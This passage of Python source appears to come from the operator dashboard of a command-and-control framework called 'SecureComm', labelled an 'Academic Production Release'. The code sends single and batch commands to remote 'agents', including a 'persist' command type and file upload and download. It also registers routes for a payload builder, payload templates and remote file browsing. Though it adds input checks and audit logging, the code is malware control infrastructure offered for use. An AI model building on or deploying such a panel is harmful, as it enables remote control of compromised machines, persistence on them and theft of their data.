                    payload_str = security.sanitize_input(raw_payload_str, max_length=COMMAND_PAYLOAD_LIMIT)

                if cmd_type == "persist" and not PERSISTENCE_ALLOWED:
                    results.append({
                        "agent_id": agent_id,
                        "success": False,
                        "error": "persistence_disabled"
                    })
                    continue

            except SecurityError as exc:
                results.append({
                    "agent_id": agent_id,
                    "success": False,
                    "error": str(exc)
                })
                continue

            # Send command
            if not command_server:
                results.append({
                    "agent_id": agent_id,
                    "success": False,
                    "error": "command_server_unavailable"
                })
                continue

            try:
                task_id = command_server.send_command(
                    agent_id=agent_id,
                    cmd_type=cmd_type,
                    payload=payload_str,
                    auth_token=auth_token,
                )

                results.append({
                    "agent_id": agent_id,
                    "success": True,
                    "task_id": task_id
                })

            except Exception as exc:
                results.append({
                    "agent_id": agent_id,
                    "success": False,
                    "error": str(exc)
                })

        # Broadcast update
        await ws_manager.broadcast_event("batch_command_sent", {
            "command_type": cmd_type,
            "agents_count": len(agent_ids),
            "successful": sum(1 for r in results if r["success"]),
            "failed": sum(1 for r in results if not r["success"]),
        })

        # Log batch command
        if audit_logger:
            audit_logger.log_security_event("batch_command_submitted", {
                "command": cmd_type,
                "agents": agent_ids,
                "operator_id": operator_id,
                "results": results,
            })

        return web.json_response({
            "results": results,
            "summary": {
                "total": len(results),
                "successful": sum(1 for r in results if r["success"]),
                "failed": sum(1 for r in results if not r["success"]),
            }
        })

    async def submit_command(request: web.Request) -> web.Response:
        """Submit single command (original endpoint with enhancements)"""
        agent_id: Optional[str] = None
        cmd_type: Optional[str] = None

        def reject(reason: str, status: int = 400, extra: Optional[Dict] = None) -> web.Response:
            if audit_logger:
                details = {"reason": reason, **(extra or {})}
                if operator_id:
                    details["operator_id"] = operator_id
                if agent_id:
                    details["agent_id"] = agent_id
                audit_logger.log_security_event("dashboard_command_rejected", details)
            return web.json_response({"error": reason}, status=status)

        try:
            payload = await request.json()
        except Exception:
            return reject("invalid_json")

        if not isinstance(payload, dict):
            return reject("invalid_payload")

        agent_id = payload.get("agent_id", "").strip()
        cmd_type = payload.get("type", "").strip().lower()
        raw_payload = payload.get("payload", "")

        # Validate agent ID format
        if not agent_id:
            return reject("invalid_agent_id")
        if not all(c.isalnum() or c == "_" for c in agent_id):
            return reject("invalid_agent_id: must be alphanumeric or underscore")
        if len(agent_id) > 255:
            return reject("invalid_agent_id: too long")

        # Validate command type
        if not cmd_type:
            return reject("invalid_type")
        if cmd_type not in ALLOWED_DASHBOARD_COMMANDS:
            return reject("invalid_command_type")

        # Validate and sanitize payload
        try:
            if cmd_type in ("upload", "download"):
                path = payload.get("path", "")
                if not path or len(path) > PATH_MAX_LENGTH:
                    return reject("invalid_path")
                path = security.sanitize_input(path, max_length=PATH_MAX_LENGTH)
                payload_str = json.dumps({"path": path})
            else:
                if isinstance(raw_payload, dict):
                    raw_payload = raw_payload.get("command", "")
                if not isinstance(raw_payload, str):
                    return reject("invalid_payload")
                payload_str = security.sanitize_input(raw_payload, max_length=COMMAND_PAYLOAD_LIMIT)

            if cmd_type == "persist" and not PERSISTENCE_ALLOWED:
                return reject("persistence_disabled", status=403)

        except SecurityError as exc:
            return reject(str(exc))

        # Authenticate and send command
        try:
            auth_token = get_operator_token()
        except Exception as exc:
            return reject("operator_auth_failed", status=403, extra={"detail": str(exc)})

        if not operational_db.get_agent(agent_id):
            return reject("agent_not_found", status=404)

        # Check rate limiting
        try:
            security.check_rate_limit(agent_id)
        except SecurityError as exc:
            return reject(str(exc), status=429)

        # Check if command server is available
        if not command_server:
            return reject("command_server_unavailable", status=503)

        try:
            task_id = command_server.send_command(
                agent_id=agent_id,
                cmd_type=cmd_type,
                payload=payload_str,
                auth_token=auth_token,
            )

            # Broadcast update
            await ws_manager.broadcast_event("command_sent", {
                "task_id": task_id,
                "agent_id": agent_id,
                "type": cmd_type
            })

        except SecurityError as exc:
            return reject(str(exc))
        except ValueError as exc:
            return reject(str(exc), status=409)
        except Exception as exc:
            return reject("command_dispatch_failed", status=500, extra={"detail": str(exc)})

        if audit_logger:
            audit_logger.log_security_event("dashboard_command_submitted", {
                "agent_id": agent_id,
                "command": cmd_type,
                "task_id": task_id,
                "operator_id": operator_id,
            })

        return web.json_response({"task_id": task_id, "status": "sent"})

    # ==================== WEBSOCKET HANDLER ====================

    async def websocket_handler(request: web.Request) -> web.WebSocketResponse:
        """WebSocket connection handler"""
        ws = web.WebSocketResponse()
        await ws.prepare(request)
        await ws_manager.add_connection(ws)

        try:
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                        # Handle client messages (e.g., ping/pong)
                        if data.get("type") == "ping":
                            await ws.send_str(json.dumps({
                                "type": "pong",
                                "timestamp": datetime.now(timezone.utc).isoformat()
                            }))
                    except json.JSONDecodeError:
                        pass
                elif msg.type == WSMsgType.ERROR:
                    logger.error(f"WebSocket error: {ws.exception()}")
        finally:
            await ws_manager.remove_connection(ws)

        return ws

    # ==================== PAGE HANDLERS (Placeholder) ====================

    async def page_dashboard(request: web.Request) -> web.Response:
        """Dashboard page - returns HTML"""
        # Serve the dashboard HTML file
        dashboard_dir = Path(__file__).resolve().parents[2] / "dashboard"
        html_file = dashboard_dir / "index.html"
        
        if html_file.exists():
            with open(html_file, 'r', encoding='utf-8') as f:
                html_content = f.read()
            return web.Response(
                text=html_content,
                content_type="text/html"
            )
        
        # Fallback if index.html not found
        return web.Response(
            text="<html><body><h1>SecureComm Dashboard v3.0</h1><p>Dashboard file not found. Please check installation.</p></body></html>",
            content_type="text/html"
        )

    # Create application
    app = web.Application(middlewares=[
        _auth_middleware(token),
        _security_headers_middleware()
    ])

    # Routes
    app.router.add_get("/", page_dashboard)

    # API Routes
    app.router.add_get("/health", health_check)
    app.router.add_get("/api/state", api_state)
    app.router.add_get("/api/agents", api_agents)
    app.router.add_get("/api/agents/{agent_id}", api_agent_detail)
    app.router.add_get("/api/commands", api_commands)
    app.router.add_get("/api/audit", api_audit)
    app.router.add_get("/api/stats", api_stats)
    app.router.add_post("/api/command", submit_command)

    # NEW API Routes
    app.router.add_post("/api/payload/build", api_payload_build)
    app.router.add_get("/api/payload/templates", api_payload_templates)
    app.router.add_get("/api/payload/templates/{template_name}", api_payload_template_detail)
    app.router.add_get("/api/files/browse", api_files_browse)
    app.router.add_post("/api/files/upload", api_files_upload)
    app.router.add_get("/api/files/download", api_files_download)
    app.router.add_get("/api/certificates", api_certificates_list)
    app.router.add_get("/api/certificates/{cert_type}/{cert_id}", api_certificate_detail)
    app.router.add_post("/api/command/batch", api_batch_command)

    # WebSocket
    app.router.add_get("/ws", websocket_handler)

    # Static files
    static_path = Path(__file__).resolve().parents[2] / "dashboard"
    if static_path.exists():
        app.router.add_static("/static", static_path)

    # Store references for cleanup
    app["ws_manager"] = ws_manager
    app["command_server"] = command_server
    app["audit_logger"] = audit_logger

    # Start WebSocket heartbeat
    app.on_startup.append(lambda app: ws_manager.start_heartbeat())
    app.on_cleanup.append(lambda app: ws_manager.stop_heartbeat())

    logger.info("Dashboard application v3.0 created successfully with enhanced features")
    return app


def run_dashboard(
    host: str = DASHBOARD_HOST,
    port: int = DASHBOARD_PORT,
    refresh_seconds: int = DASHBOARD_REFRESH_SECONDS,
    token: Optional[str] = DASHBOARD_TOKEN,
) -> None:
    """Run the dashboard server"""
    app = create_app(
        db_path=OPERATIONAL_DB_PATH,
        audit_log_dir=AUDIT_LOG_DIR,
        refresh_seconds=refresh_seconds,
        token=token,
    )

    print(f"""
🔥 SecureComm Dashboard v3.0 - Academic Production Release 🔥
═══════════════════════════════════════════════════════════════════════════════

Dashboard URL:     http://{host}:{port}
API Endpoint:      http://{host}:{port}/api
WebSocket:         ws://{host}:{port}/ws

NEW FEATURES:
✅ Payload Builder           - /api/payload/build
✅ File Management           - /api/files/browse, upload, download
✅ PKI Certificate Inspector - /api/certificates
✅ Batch Command Execution   - /api/command/batch
✅ Command Templates         - /api/payload/templates

Press Ctrl+C to stop

═══════════════════════════════════════════════════════════════════════════════
""")

    web.run_app(app, host=host, port=port)


if __name__ == "__main__":
    run_dashboard()
